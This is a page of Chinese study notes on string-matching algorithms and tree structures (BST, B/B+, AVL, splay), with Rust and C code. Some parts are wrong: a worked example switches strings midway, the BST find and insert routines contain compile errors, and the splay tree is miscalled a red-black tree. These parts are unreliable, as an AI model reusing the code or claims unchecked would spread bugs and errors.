<p>单串匹配的暴力算法是显而易见的，复杂度为$O(|S||T|)$。但是实际上优化空间是很大的，下面要介绍的KMP算法就是一个复杂度为$O(|S|+|T|)$的算法。</p>
<h3 id="前缀函数算法"><a class="header" href="#前缀函数算法">前缀函数算法</a></h3>
<p>对于一个长度为$n$的字符串$s$，他的**前缀函数$\pi(i), i\in[0,n-1]$**被定义为字符串s的子串s[0..=i]的最常的相等的<u>真</u>前缀和<u>真</u>后缀的长度。例如，对于字符串<code>abcaba</code></p>
<ul>
<li>$\pi(0) = 0$，因为<code>a</code>连真前缀都没有，他太短了。</li>
<li>$\pi(1) = 0$，<code>ab</code>的唯一真前缀<code>a</code>不等于唯一真后缀<code>b</code></li>
<li>$\pi(2) = 0$，<code>abc</code>没有相等的真前缀和真后缀。</li>
<li>$\pi(3) = 1$，<code>abca</code>有相等的真前缀和真后缀<code>a</code>。</li>
<li>$\pi(4) = 2$，<code>abcab</code>有相等的真前缀<code>ab</code>。</li>
<li>$\pi(5) = 0$，<code>abcabd</code>没有相等的真前缀和真后缀。</li>
</ul>
<p>那么，我们如何求前缀函数呢？我们可以用O(n)的时间代价算出$\pi(i)$，当然结果需要用O(n)的空间代价存储，这是废话了。程序如下</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn prefix_function(s: &amp;[u8]) -&gt; Vec&lt;usize&gt; {
    // pi存储着前缀函数的值
    let mut pi = vec![0; s.len()];
    let mut j;

    for i in 1..s.len() {
        j = pi[i - 1];
        while j &gt; 0 &amp;&amp; s[i] != s[j] {
            // 这个有点奇怪，换成j-=1会好理解，但是效率不高
            j = pi[j - 1];
        }
        if s[i] == s[j] {
            j += 1;
        }
        pi[i] = j;
    }
    pi
}
<span class="boring">}
</span></code></pre></pre>
<p>首先基于这样一个事实，那就是字符串长度+1（i+1），得到的前缀函数最多+1。所以我们从j = pi[i-1] 开始比较。</p>
<p>我们其实要比的真前缀和真后缀分别是 <code>s[0..=j]</code> 和 s<code>[i-j..=i]</code>，所以我们比较<code>s[i]</code>是否等于<code>s[j]</code>。如果不等的话，我们可以直接跳到<code>j = pi[j-1]</code>再去比较，因为我们要<strong>从之前的匹配失败中获取教训</strong>。以<code>abcabd</code>为例：</p>
<ol>
<li>因为<code>j = pi[4] = 2</code>，也就是说之前前缀<code>ab == ab</code>匹配上了。我们比较<code>c</code>和最后一个<code>d</code>，发现不相等。</li>
<li>这个时候，我们就应该意识到，我们没有必要再比较第一个<code>b</code>是否等于最后一个<code>d</code>了，没有意义。因为我们已经发现<code>pi[pi[4]-1] == 0</code>，也就是说<code>a != b</code>，所以<code>ab != bd</code>。</li>
</ol>
<h3 id="knuth-morris-pratt算法"><a class="header" href="#knuth-morris-pratt算法">Knuth-Morris-Pratt算法</a></h3>
<p>上面对前缀函数的介绍是为了引出<strong>KMP算法</strong>。他解决的就是单串匹配问题。这个算法的复杂度是$O(|t| + |s|)$，比暴力做法$O(|t||s|)$好多了。</p>
<p>这个算法的思路是，构造一个新的字符串s+#+t，其中#为一个既不出现在s也不出现在t的分隔符。然后计算该字符串的前缀函数。</p>
<p>我们考虑得到的前缀函数pi的意义，从pi[|s| +1 .. |s| + |t| + 1]，如果其中有一个等于n，意味着什么？意味着我们在t找到了一个和s相同的子串。分隔符存在的意义是让pi[x]不会大于n。</p>
<p>当然，在实现的时候，你并不需要真的构造这个s+#+t。</p>
<h3 id="boyer-moore算法"><a class="header" href="#boyer-moore算法">Boyer-Moore算法</a></h3>
<p><strong>BM算法</strong>也是解决单串匹配问题的。他的思路和KMP算法有所不同。它采用的是后缀的匹配，而KMP是前缀。</p>
<p>不过也是利用之前匹配失败的信息减少匹配次数。他的时间复杂度和KMP是一样的。不过，BM算法更适合用来解决自然语言的匹配问题，而KMP算法更适合用来解决匹配串小的匹配问题，比如DNA。<sup class="footnote-reference"><a href="#3">1</a></sup></p>
<h3 id="boyer-moore-sunday算法"><a class="header" href="#boyer-moore-sunday算法">Boyer-Moore-Sunday算法</a></h3>
<p><strong>Sunday算法</strong>通常用作一般情况下实现最简单而且平均表现最好之一的实用算法，通常表现比BM要快一点。</p>
<h3 id="bmhbnfs-算法"><a class="header" href="#bmhbnfs-算法">BMHBNFS 算法</a></h3>
<p>这个算法根据时间节省还是空间节省为第一目标，会有差别巨大的不同实现。空间节省的版本被CPython用来实现字符串的查找<sup class="footnote-reference"><a href="#4">2</a></sup>。</p>
<h2 id="1模式串-n字符串"><a class="header" href="#1模式串-n字符串">1模式串-n字符串</a></h2>
<p>先考虑一个简单的问题，是<strong>1个模式串t是否在n个字符串S中</strong>。你可以用暴力的方法一个一个进行匹配，时间代价为$O(n|t|)$（注意这里不是判断子串，而是相等）。不过你可以想到这个问题就像查字典一样，你要在字典S中找单词t是不可能一个一个找过来的，肯定是先找第一个字母，再找第二个字母这样。所以我们引入了字典树来解决这个问题。</p>
<p>然后如果问题是判断<strong>1个模式串是否是n个字符串中某一个的子串</strong>，一种方法将它们直接连起来便可作为一个待匹配串处理（串之间可以插入不可能出现的字符，防止如模式串为'abc'，匹配上了'aaa'和'bcd'的情况），转换成1模式串-1字符串问题用KMP算法解决，那么时间代价为$O(n|s| + |t|)$；或者直接用n次KMP算法，这个效率会稍微低一点，为$O(n(|s| + |t|))$。</p>
<h3 id="trie字典树"><a class="header" href="#trie字典树">Trie字典树</a></h3>
<p>字典树用于统计、排序、和保存大量字符串。所以经常被搜索引擎系统用于文本词频统计、自动补全。它的优点是：利用字符串的公共前缀来减少查询时间，最大限度地减少无谓的字符串比较。如下图，保存了to, tea, ted, ten, A, i, in, inn。</p>
<img src="Basic/DataStructure/String/../images/webp.webp" alt="img" style="zoom:50%;" />
<p>用于查找：顺着树遍历下来就好了，时间代价变成$O(|t|)$。</p>
<p>用于自动补全：比如上面这个例子，你输入了t之后他就可以提示你to/te。</p>
<p>基本的数据结构可以这么表达。当然可以给节点添加其他的属性。使用很简单，构建一棵树，找的时候顺着树搜索就可以了。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct Node { 
    children: [Option&lt;Box&lt;Node&gt;&gt;; 26],
    is_word: bool,
}
<span class="boring">}
</span></code></pre></pre>
<p>还可以使用double array trie，即用两个数组记录转移目标。double array trie（简称DAT，也有人简称DART）包括base和check两个数组，其中base中记录结点转移表的基地址，check记录由哪个结点转移过来。</p>
<h3 id="哈希表"><a class="header" href="#哈希表">哈希表</a></h3>
<p>如果只是为了判断t是否在S中，也可以用哈希表。因为很多语言都内置了“集合”这个数据结构，所以会非常方便。理想情况的哈希表的查找时间复杂度为$O(1)$，不过他只能解决精确匹配的情况，没有Trie那么强大。</p>
<pre><code class="language-python">&gt;&gt;&gt; set = {&quot;hello&quot;, &quot;hi&quot;, &quot;h&quot;}
&gt;&gt;&gt; &quot;h&quot; in set
True
</code></pre>
<h2 id="n模式串-1字符串"><a class="header" href="#n模式串-1字符串">n模式串-1字符串</a></h2>
<p>这种问题叫做“多模匹配”问题。</p>
<h3 id="自动机"><a class="header" href="#自动机">自动机</a></h3>
<p>下面的<strong>自动机</strong>指的是“确定有限状态自动机DFA”，没有学过算法但是大学学过编译原理的同学回想起来这玩意儿在词法分析的时候学过。自动机接受一个字符串，然后给出匹配/不匹配的结果。所以我们上面的KMP算法、Trie树都可以算作是自动机。</p>
<h3 id="ac自动机"><a class="header" href="#ac自动机">AC自动机</a></h3>
<p>AC自动机是一种多模匹配算法。简单来说，建立一个 AC 自动机有两个步骤：</p>
<ol>
<li>将所有的字符串$S$构成一棵 Trie。按照之前的办法构建。</li>
<li>KMP 的思想：对 Trie 树上所有的结点构造<strong>失配指针</strong>。</li>
</ol>
<p>B站的这个可视化视频简直太妙了。失配指针，目的是为了让匹配失败的时候，去尝试匹配其他的节点。</p>
<iframe src="//player.bilibili.com/player.html?aid=544126464&bvid=BV14v4y1Z7fu&cid=298204606&page=1" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height = 800px> </iframe>
<p>失配指针的构建思想，参考<a href="https://oi-wiki.org/string/ac-automaton/">OIwiki</a>：</p>
<p><img src="Basic/DataStructure/String/../images/image-20220512212025813.png" alt="image-20220512212025813" /></p>
<h3 id="后缀自动机"><a class="header" href="#后缀自动机">后缀自动机</a></h3>
<p>后缀自动机(Suffix Automation)也可以解决多模匹配问题，后缀自动机几乎能用于所有与子串相关的问题，比如寻找两个字符串的公共子串。</p>
<p>他的基本思路可以认为是在Trie上存储了一个字符串的所有子串。<sup class="footnote-reference"><a href="#5">3</a></sup></p>
<p>如果alphabet的字符数量为k，字符串长度为n，那么后缀自动机的时间复杂度和空间复杂度都是$O(n logk)$，一般我们认为k是常数，就是$O(n)$。<sup class="footnote-reference"><a href="#6">4</a></sup></p>
<h2 id="n模式串-n字符串"><a class="header" href="#n模式串-n字符串">n模式串-n字符串</a></h2>
<h3 id="广义后缀自动机"><a class="header" href="#广义后缀自动机">广义后缀自动机</a></h3>
<p>广义后缀自动机 (General Suffix Automaton) 将后缀自动机整合到字典树中来解决对于多个字符串的子串问题。</p>
<hr />
<p>参考链接</p>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">5</sup>
<p>https://www.ruanyifeng.com/blog/2013/05/boyer-moore_string_search_algorithm.html</p>
</div>
<div class="footnote-definition" id="3"><sup class="footnote-definition-label">1</sup>
<p>What are the main differences between the Knuth-Morris-Pratt and Boyer-Moore search algorithms, https://stackoverflow.com/questions/12656160/what-are-the-main-differences-between-the-knuth-morris-pratt-and-boyer-moore-sea
<sup class="footnote-reference"><a href="#4">2</a></sup>: https://oi-wiki.org/string/bm/#_16
<sup class="footnote-reference"><a href="#5">3</a></sup>: https://www.zhihu.com/question/386980825
<sup class="footnote-reference"><a href="#6">4</a></sup>: Suffix Automaton, https://cp-algorithms.com/string/suffix-automaton.html</p>
</div>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tree-and-bst"><a class="header" href="#tree-and-bst">Tree and BST</a></h1>
<h2 id="树的概念"><a class="header" href="#树的概念">树的概念</a></h2>
<p><strong>树Tree</strong>是很重要的数据结构。在图论中我们定义树是<strong>无向无环连通图</strong>，不过实际上树有很多等价的定义方式。</p>
<p>树的概念中有很多术语：</p>
<ul>
<li><strong>节点的度</strong>：一个节点含有的子树的个数称为该节点的度；</li>
<li><strong>树的度</strong>：一棵树中，最大的节点的度称为树的度；</li>
<li><strong>叶节点</strong>或<strong>终端节点</strong>：度为零的节点；</li>
<li><strong>父亲节点</strong>或<strong>父节点</strong>：若一个节点含有子节点，则这个节点称为其子节点的父节点；</li>
<li><strong>孩子节点或子节点</strong>：一个节点含有的子树的根节点称为该节点的子节点；</li>
<li><strong>兄弟节点</strong>：具有相同父节点的节点互称为兄弟节点；</li>
<li>节点的<strong>层次</strong>：从根开始定义起，根为第1层，根的子节点为第2层，以此类推；</li>
<li>树的<strong>高度</strong>或<strong>深度</strong>：树中节点的最大层次；</li>
<li><strong>节点的祖先</strong>：从根到该节点所经分支上的所有节点；</li>
<li><strong>子孙</strong>：以某节点为根的子树中任一节点都称为该节点的子孙。</li>
<li><strong>森林</strong>：由m（m&gt;=0）棵互不相交的树的集合称为森林；</li>
</ul>
<p>树的一种特例<strong>二叉搜索树Binary Search Tree</strong>非常常见且重要。二叉搜索树是满足下列条件的树</p>
<ol>
<li>每个节点最多含有两个子树</li>
<li>树的节点之间存在顺序关系：若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值； 若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值； 它的左、右子树也分别为二叉搜索树。</li>
</ol>
<p>二叉查找树中还有一些特殊类型</p>
<ul>
<li><strong>完全二叉树Complete Binary Tree</strong>：一棵深度为k的有n个结点的二叉树，对树中的结点按从上至下、从左到右的顺序进行编号，如果编号为i（1≤i≤n）的结点与满二叉树中编号为i的结点在二叉树中的位置相同，则这棵二叉树称为完全二叉树。</li>
<li><strong>满二叉树Full Binary Tree</strong>：深度为K并且有$2^K-1$个节点的二叉树。这个有另一种解释。</li>
<li><strong>平衡二叉树Balance Tree</strong>：它或者是一颗空树，或它的左子树和右子树的深度之差(平衡因子)的绝对值不超过1，且它的左子树和右子树都是一颗平衡二叉树。</li>
</ul>
<h2 id="树的表示"><a class="header" href="#树的表示">树的表示</a></h2>
<p>我们一般用链表来表示树的结构。</p>
<p>对于一般的树，因为不知道子节点的数量，所以用两个指针分别指向他的第一个子节点和他的下一个兄弟节点。</p>
<pre><code class="language-c">struct TreeNode {
	struct TreeNode* first_child;
	struct TreeNode* next_sibling;
	Elementtype value;
};
</code></pre>
<p>对于二叉搜索树，可以用两个指针分别指向他的左右子节点。</p>
<pre><code class="language-c">struct BstNode {
    struct BstNode* left_child;
    struct BstNode* right_child;
    ElementType value;
}
</code></pre>
<p>由于二叉树的特殊性，也可以用数组进行表示，这会浪费一些空间，但是可以让节点在空间上连续。</p>
<pre><code class="language-c">ElementType bst[N];
ElementType root = bst[0];

ElementType node = bst[i];
ElementType node_left = bst[2*i + 1];
ElementType node_right = bst[2*i + 2];
</code></pre>
<h2 id="树的操作"><a class="header" href="#树的操作">树的操作</a></h2>
<p>树最重要的操作就是遍历了，一般的树有两种遍历方式，深度优先和广度优先，深度优先又可以分为先根和后跟。</p>
<p>对于二叉搜索树，深度优先遍历又可以分为<strong>前序Preorder</strong>（中左右），<strong>中序Inorder</strong>（左中右）和<strong>后序Postorder</strong>（左右中）。</p>
<p>下面例程中遍历做的事情就是打印一下节点的内容，<code>printf</code>。</p>
<pre><code class="language-c">//深度优先遍历 先根
void dfs(struct TreeNode *root) {
  printf(&quot;%d\n&quot;, root-&gt;value);
  struct TreeNode *child = root-&gt;first_child;
  while (child != NULL) {
    dfs(child);
    child = child-&gt;next_sibling;
  }
}
// 二叉搜索树的 后序遍历 数组表示的
void postorder(int root[],int index)
{
    if (root[index])
    {
        postorder(root,index*2+1);
        postorder(root,index*2+2);
		printf(&quot;%d\n&quot;, root[index]);
    }
}
</code></pre>
<p>二叉查找树的增删改查都非常简单。只要知道查就行，查的过程就是不断的和节点进行比较，如果查的值&lt;节点的值就往节点的左子树查（没有左子树就查不到），查的值&gt;节点的值就往节点的右子树查（没有右子树就查不到），查的值=节点的值就找到了。增就是查+增加一个节点，删就是查+删除这个节点。不过增删需要修改父节点包含的指针，这个实现的时候注意一下就行。</p>
<p>时间复杂度平均$O(logN)$，最差$O(N)$。最差情况这个树被你建成了一个链表。</p>
<h2 id="二叉查找树binary-search-tree"><a class="header" href="#二叉查找树binary-search-tree">二叉查找树Binary Search Tree</a></h2>
<ul>
<li></li>
</ul>
<h3 id="二叉树的表示"><a class="header" href="#二叉树的表示">二叉树的表示</a></h3>
<pre><code class="language-c">typedef struct treenode* Tree;
struct treenode
{
	Tree Left;
	Tree Right;
	Elementtype Value;
};
</code></pre>
<p>ADT：查找和插入都不难，但是删除要考虑三种情况：</p>
<ul>
<li>0度节点：Reset its parent link to NULL.很简单，删了就好。</li>
<li>1度节点：Replace the node by its single child.也比较简单，把它的孩子当作它。</li>
<li>2度节点：Replace the node by <strong>the largest one in its left subtree</strong> or <strong>the smallest one in its right subtree</strong>. Then Delete the replacing node from the subtree.</li>
<li>另一个办法是Lazy deletion，标记为删除但不从树中移除。</li>
</ul>
<pre><code class="language-c">//==================查找=====================================
Tree find(Elementtype x,Tree t)
{
    if (t==NULL) return NULL;	//找不到
    if (x&lt;t-&gt;Value)
        return find(t-&gt;left);	//所有比当前节点小的节点都在左子树
    else if (x&gt; t-&gt;Value)
        return find(t-&gt;right);	//所有比当前节点大的节点都在右子树
    else
        return t;	//找到了
}//时间复杂度O(depth)，和深度密切相关，尾递归tail recursion
Tree find(Elementtype x,Tree T)
{
    while (T)
    {
        if (x==T-&gt;Value) return T;
        if (x &lt; T-&gt;Value) T=T-&gt;left;
        else T=T-&gt;right;
    }
    return NULL;
s}//时间复杂度O(depth),和深度密切相关
Tree findMin(Tree T)
{
    if (T==NULL) return NULL;
    while (T-&gt;left) T=T-&gt;left;
    return T;
}//findMax同理
//==================插入=====================================
Tree insert(Elementtype v,Tree t)
{
    if (t==NULL){
        t = malloc(sizeof(struct treenode));
        if (t==NULL)
            ERROR();
        else{
            t-&gt;element = v;
            t-&gt;left = t-&gt;right = NULL;
        }
    }//创建一个节点
    else if (v &lt; t-&gt;value)
        t-&gt;left = insert(v,t-&gt;left);
    else if (v &gt; t-&gt;value)
        t-&gt;right = insert(x,t-&gt;right);
    //else，说明和现在的节点相同了，在这里我们什么都没有做。我们也可以记个数。
    return t;//不要忘了这个
}
//==================删除=====================================
Tree delete(Elementtype x,Tree t)
{
    
}//我们也可以通过给计数器-1来表示删除
</code></pre>
<h3 id="线索二叉树-threaded-binary-tree"><a class="header" href="#线索二叉树-threaded-binary-tree">线索二叉树 Threaded Binary Tree</a></h3>
<p>根据线索性质的不同，线索二叉树可分为前序线索二叉树、中序线索二叉树和后序线索二叉树三种。一般线索二叉树指的是中序线索二叉树：</p>
<ul>
<li>If Tree-&gt;Left is null, replace it with a pointer to the inorder predecessor of Tree. 中序的前继</li>
<li>If Tree-&gt;Right is null, replace it with a pointer to the inorder successor of Tree. 中序的后继</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="b-tree-and-b-tree"><a class="header" href="#b-tree-and-b-tree">B Tree and B+ Tree</a></h1>
<p>有时候你可能还会看到B-Tree，但是这个&quot;-&quot;不是“减”，他就是个分隔符，B-Tree就是B Tree。不过B Tree和B+ Tree是确实不一样的，但是他们解决的问题是类似的。</p>
<p>类似于红黑树和AVL树，B树也是一种平衡树。不过他的用武之地是在数据规模很大，以至于内存装不下的场景。原因是B树是一种扁平的树，在他的高度是比较低的，一个节点的子节点是比较多的。这样一来，我们在查找过程中，一次就可以读入大量的节点，可以读的次数比较少，这对磁盘这种读取开销很大的设备来说是非常好的。</p>
<p>所以，在数据库、文件系统中都有B树的应用。</p>
<h2 id="定义和特点"><a class="header" href="#定义和特点">定义和特点</a></h2>
<p>B树</p>
<ol>
<li>
<p>所有节点关键字是按递增次序排列，并遵循左小右大原则。</p>
</li>
<li>
<p><strong>根结点，叶节点，内部节点</strong>指的是除了根节点和叶节点外的其他节点。</p>
</li>
<li>
<p>阶order: 如果B树的order=n，那么每个节点拥有子节点的数量不超过$n$，并且根节点的子节点的数量在$[2, n]$，而内部节点的子节点数量在$[ceil(n/2), n]$之间。</p>
<p>每个节点的key的数量范围在$[ceil(n/2)-1, n-1]$。对于非叶节点，有$k$个子节点就有$k-1$个key。</p>
</li>
<li>
<p>所有叶子节点均在同一层、叶子节点除了包含了关键字和关键字记录的指针外也有指向其子节点的指针只不过其指针地址都为null对应下图最后一层节点的空格子</p>
</li>
</ol>
<p>不如一个例子来的实在，这是一个order = 3的B树，每个节点的key的数量不超过2，子节点数量不超过3。key和指针“交错”排列，有序。</p>
<p><img src="Basic/DataStructure/Tree/../images/search-1.png" alt="B-tree" /></p>
<p>B+树</p>
<p>类似于B树，但是所有的数据只存放在叶子节点中（所以内部节点的大小会更小，从图中可能看不出来，因为只画了key，没有画value），所有的叶子节点都有一个链指针。</p>
<p><img src="Basic/DataStructure/Tree/../images/search-tree.png" alt="B+ tree" /></p>
<h2 id="实现思路-b树"><a class="header" href="#实现思路-b树">实现思路 B树</a></h2>
<p>我们思考四种操作-增删改查。其中查和改是类似的，改就是先查再改嘛。其中查的操作和普通的搜索树是类似的，而增删操作因为可能会破坏B树的性质，所以可能需要一些额外的操作。</p>
<h3 id="search"><a class="header" href="#search">Search</a></h3>
<p>查找key：从根节点开始，二分查找节点的所有key[i]，找到key合适的插入地方，如果key == key[i]那么就找到了，否则key应该</p>
<ol>
<li>在key[i]和key[i+1]之间</li>
<li>小于key[0]</li>
<li>大于key[max]</li>
</ol>
<p>总之，都有合适的指向子节点的指针，如果指向子节点的指针为空（叶节点），那么就找不着。</p>
<h3 id="insert-翻译"><a class="header" href="#insert-翻译"><a href="https://www.programiz.com/dsa/insertion-into-a-b-tree">Insert</a> (翻译)</a></h3>
<p>插入操作包括两个事件：搜索到合适的节点然后插入，如果需要的话将节点拆分。插入key</p>
<ol>
<li>如果树是空的，分配一个root节点然后插入key，结束。</li>
<li>如果树是非空的，<strong>查找</strong>合适的节点，插入key（如果Key之前不存在，要插入的地方总是叶节点）
<ol>
<li>如果该节点已经full了
<ol>
<li>将该节点从中间拆分，成为两个新的节点，记作Left和Right</li>
<li>将中间的key<strong>插入</strong>父节点，让左指针指向Left，右指针指向Right （注意这里又是一个插入动作，递归执行）</li>
</ol>
</li>
<li>如果该节点没有full，结束。</li>
</ol>
</li>
</ol>
<p><img src="Basic/DataStructure/Tree/../images/insertion.png" alt="一个例子，他的order = 3" /></p>
<h3 id="deletion-翻译"><a class="header" href="#deletion-翻译"><a href="https://www.programiz.com/dsa/deletion-from-a-b-tree">Deletion</a> (翻译)</a></h3>
<p>虽然我觉得惰性删除（标记一下删除，不改变树的结构）挺好的，但是删除总是必要的。他还挺麻烦。假设我们要删除key，依然是先搜索到key然后删除，如果需要的话改变树的结构。</p>
<p>首先我们复习一下，B树的要求，对于order = n的B树</p>
<ol>
<li>一个节点最多有n个子节点。</li>
<li>一个节点最多有n-1个key。</li>
<li>内部节点最少有ceil(n/2)个子节点</li>
<li>除了根节点，一个节点最少有ceil(n/2)-1个key。</li>
</ol>
<p>有三个情况</p>
<ol>
<li>要删除的key在叶节点中，我们将他删除
<ol>
<li>如果符合key数量要求，结束</li>
<li>如果不符合key数量要求
<ol>
<li>如果他的左/右兄弟的节点key数量比最少key数量要多，就借一个，结束。</li>
<li>如果他的左/右兄弟节点都已经是最少key数量了，就得和左/右<strong>合并</strong>了。（合并操作会删除父节点的一个key，父节点的key数量可能会不满足条件）</li>
</ol>
</li>
</ol>
</li>
<li>要删除的key在非叶节点中，
<ol>
<li>如果他的<strong>前驱节点</strong>（左边指针指向的节点）比最少key数量要多，就借一个替换，结束。</li>
<li>如果他的<strong>后继节点</strong>（右边指针指向的节点）比最少key数量要多，就借一个替换，结束。</li>
<li>如果他的前驱/后继都已经是最少key数量了，就将key删除，把他的前驱和后继<strong>合并</strong>。（前驱和后继合并之后，该非叶节点的key数量可能会不满足条件）</li>
</ol>
</li>
<li>之前提到的两种情况，导致非叶节点的key的数量不满足条件，这个时候我们的处理方式其实和1.2是一样的。</li>
</ol>
<h2 id="实现思路-b树-1"><a class="header" href="#实现思路-b树-1">实现思路 B+树</a></h2>
<p>已经介绍了B树了，B+树的思路其实是类似的。</p>
<p>查找不必多说。</p>
<p>插入的话，其实和B树也差不多。在节点满了的时候，拆成两个节点，把中间的key更新到父节点上去，如果父节点满了这样递归的操作下去。</p>
<p>删除的话，其实也很类似吧。</p>
<h2 id="复杂度分析-3"><a class="header" href="#复杂度分析-3">复杂度分析</a></h2>
<p>B+树和B树是差不多的。这里的order = m，节点数量 = n。</p>
<div class="table-wrapper"><table><thead><tr><th>操作</th><th>复杂度</th></tr></thead><tbody>
<tr><td>查找</td><td>log(m)log(n)</td></tr>
<tr><td>删除</td><td>log(m)log(n)</td></tr>
<tr><td>插入</td><td>log(m)log(n)</td></tr>
</tbody></table>
</div>
<p>log(m)是读出节点内key后二分查找的复杂度，log(n)是遍历节点的复杂度，我们一般在使用B树的时候考虑的是他的IO复杂度，也就是log(n)</p>
<h2 id="实例代码"><a class="header" href="#实例代码">实例代码</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="avl-tree-and-splay-tree"><a class="header" href="#avl-tree-and-splay-tree">AVL Tree and Splay Tree</a></h1>
<p>要介绍的AVL Tree是简单的平衡树，虽然说性能上可能不如红黑树，但是他很简单。Splay Tree也是一个简单的红黑树，但是还不如AVL Tree，没有什么实用价值。</p>
<h2 id="avl-tree"><a class="header" href="#avl-tree">AVL Tree</a></h2>
<p>AVL Tree是会自己保持平衡的二叉树。不过AVL Tree有他自己的平衡定义</p>
<blockquote>
<p>平衡定义：每一个节点的左子树和右子树的高度相差不超过1。
那么，对于一个高度为H的树，他最少节点数量$num(h)=num(h-1)+num(h-2)+1$。而$num(1)=2$(对一个空树，规定他的height=-1)。由此我们可以证明$height = O(log Num)$。而我们的查找时间正是和height成正比。2 4 7 12 20 33</p>
</blockquote>
<p>我们定义Balance Factor = 左子树的height-右子树的height，所以在AVL Tree中他只可能是-1,1,0。</p>
<h3 id="复杂度分析-4"><a class="header" href="#复杂度分析-4">复杂度分析</a></h3>
<div class="table-wrapper"><table><thead><tr><th>算法</th><th><strong>平均</strong></th><th><strong>最差</strong></th></tr></thead><tbody>
<tr><td>空间</td><td>O(n)</td><td>O(n)</td></tr>
<tr><td>搜索</td><td>O(log n)</td><td>O(log n)</td></tr>
<tr><td>插入</td><td>O(log n)</td><td>O(log n)</td></tr>
<tr><td>删除</td><td>O(log n)</td><td>O(log n)</td></tr>
</tbody></table>
</div>
<h3 id="操作"><a class="header" href="#操作">操作</a></h3>
<p>删除操作：我们通常使用Lazy deletion。
查找操作：AVL Tree的查找最坏情况时间复杂度也是$O(log N)$
插入操作：树的插入，不同于一般的二叉树。我们在插入时，要检测树是否平衡。如果不平衡，需要对树的<strong>局部</strong>进行旋转。</p>
<ul>
<li>双旋：
<img src="Basic/DataStructure/Tree/../images/1614668070738.jpg" alt="" />
<img src="Basic/DataStructure/Tree/../images/1614668074970.jpg" alt="" /></li>
<li>单旋：
<img src="Basic/DataStructure/Tree/../images/1614668078573.jpg" alt="" />
<img src="Basic/DataStructure/Tree/../images/1614673153658.jpeg" alt="" /></li>
</ul>
<h3 id="例程"><a class="header" href="#例程">例程</a></h3>
<p>代码要点：
旋转操作记得更新深度</p>
<pre><code class="language-c">#define MAX(a,b) ((a)&gt;(b)?(a):(b))

struct AvlNode;
typedef struct AvlNode* AvlTree;
typedef int Elementtype;
struct AvlNode
{
    Elementtype Element;
    AvlTree Left;
    AvlTree Right;
    int height;
};
/* 简单起见，不考虑Malloc失败的情况 */
static int Height(AvlTree P)
{
    if (P==NULL) return -1;
    else return P-&gt;height;
}
static AvlTree RotateLL(AvlTree A)
{
    AvlTree B = A-&gt;Left;
    A-&gt;Left = B-&gt;Right;
    B-&gt;Right = A;
    A-&gt;height = MAX(Height(A-&gt;Left),Height(A-&gt;Right))+1;
    B-&gt;height = MAX(Height(B-&gt;Left),Height(B-&gt;Right))+1;
    return B;
}
static AvlTree RotateRR(AvlTree A)
{
    AvlTree B = A-&gt;Right;
    A-&gt;Right = B-&gt;Left;
    B-&gt;Left = A;
    A-&gt;height = MAX(Height(A-&gt;Left),Height(A-&gt;Right))+1;
    B-&gt;height = MAX(Height(B-&gt;Left),Height(B-&gt;Right))+1;
    return B;
}
static AvlTree RotateLR(AvlTree A)
{
    AvlTree C = A-&gt;Left-&gt;Right;
    AvlTree B = A-&gt;Left;
    B-&gt;Right = C-&gt;Left;
    A-&gt;Left = C-&gt;Right;
    C-&gt;Left = B;
    C-&gt;Right = A;

    A-&gt;height = MAX(Height(A-&gt;Left),Height(A-&gt;Right))+1;
    B-&gt;height = MAX(Height(B-&gt;Left),Height(B-&gt;Right))+1;
    C-&gt;height = MAX(Height(C-&gt;Left),Height(C-&gt;Right))+1;
    return C;
}
static AvlTree RotateRL(AvlTree A)
{
    AvlTree C = A-&gt;Right-&gt;Left;
    AvlTree B = A-&gt;Right;
    B-&gt;Left = C-&gt;Right;
    A-&gt;Right = C-&gt;Left;
    C-&gt;Right = B;
    C-&gt;Left = A;

    A-&gt;height = MAX(Height(A-&gt;Left),Height(A-&gt;Right))+1;
    B-&gt;height = MAX(Height(B-&gt;Left),Height(B-&gt;Right))+1;
    C-&gt;height = MAX(Height(C-&gt;Left),Height(C-&gt;Right))+1;
    return C;
}
AvlTree Insert(Elementtype X, AvlTree T)
{
    if (T==NULL)    //root
    {
        T = malloc(sizeof(struct AvlNode));
        T-&gt;Element = X;
        T-&gt;height = 0;  
        T-&gt;Left = T-&gt;Right = NULL;
    } 
    else if (X&lt;T-&gt;Element)
    {
        T-&gt;Left = Insert(X,T-&gt;Left);    //左边插入，有两种情况
        if (Height(T-&gt;Left) - Height(T-&gt;Right) == 2)
            if (X &lt; T-&gt;Left-&gt;Element)   //LL
                T = RotateLL(T);
            else 
                T = RotateLR(T);
    }
    else if (X&gt;T-&gt;Element)
    {
        T-&gt;Right = Insert(X,T-&gt;Right);  
        if (Height(T-&gt;Right) - Height(T-&gt;Left) == 2)
            if (X &gt; T-&gt;Right-&gt;Element)  //RR
                T = RotateRR(T);
            else
                T = RotateRL(T);
    }
    /* else X is already in tree, we do nothing */

    T-&gt;height = MAX(Height(T-&gt;Left),Height(T-&gt;Right))+1;
    return T;
}
</code></pre>
<h2 id="splay-tree"><a class="header" href="#splay-tree">Splay Tree</a></h2>
<p>他保证从空树开始任意连续M次对树的操作最多花费$O(Mlog N)$的时间。但是不排除任意一次操作花费$O(N)$的可能。splay tree的基本想法是，每次访问X之后，通过一系列下面的两个操作<strong>把X移到ROOT</strong>，然后在这个过程中，树的高度也会变小。
For any nonroot node X , denote its parent by P and grandparent by G :</p>
<p><img src="Basic/DataStructure/Tree/../images/image-20210707164926393.png" alt="image-20210707164926393" /></p>
<ul>
<li>zig-zag：就是上面的RotationRL和RotationLR</li>
<li>zig-zig：这里进行了两次RotationLL或RotationRR。比如上面的图，先旋转PG，再旋转XP。需要注意的点是两个旋转的顺序，是先上后下。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="disjoint-set"><a class="header" href="#disjoint-set">Disjoint Set</a></h1>
<p>我们要介绍的其实是<strong>并查集</strong>算法，他用于处理一些不交集（Disjoint sets，一系列没有重复元素的集合）的合并及查询问题。他支持两种操作</p>
<ul>
